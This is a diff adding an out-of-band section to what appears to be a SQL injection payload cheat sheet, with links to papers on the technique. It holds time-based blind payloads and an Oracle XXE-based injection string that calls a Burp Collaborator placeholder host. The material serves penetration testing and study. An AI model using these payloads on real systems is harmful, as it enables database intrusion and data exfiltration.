@@ -109,5 +109,12 @@ waitfor delay '0:0:5'
 BENCHMARK(10000000,rand())
 ....
 ```
+OUT-OF-BAND
+```
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://BURP-COLLABORATOR-SUBDOMAIN/">+%remote;]>'),'/l')+FROM+dual--
+```
 Other Resources:
+https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf
+https://www.pwc.com.tr/tr/assets/pdf/out-of-band-oob-sql-injection.pdf
+https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwj-ir6t7bCCAxX_FRAIHVEdCXU4ChAWegQIBRAB&url=https%3A%2F%2Fzenodo.org%2Frecord%2F3556347%2Ffiles%2FA%2520Study%2520of%2520Out-of-Band%2520SQL%2520Injection.pdf%3Fdownload%3D1&usg=AOvVaw0hGkiklfL04cE-qOCuEaPa&opi=89978449
 https://www.w3schools.com/sql/sql_comments.asp
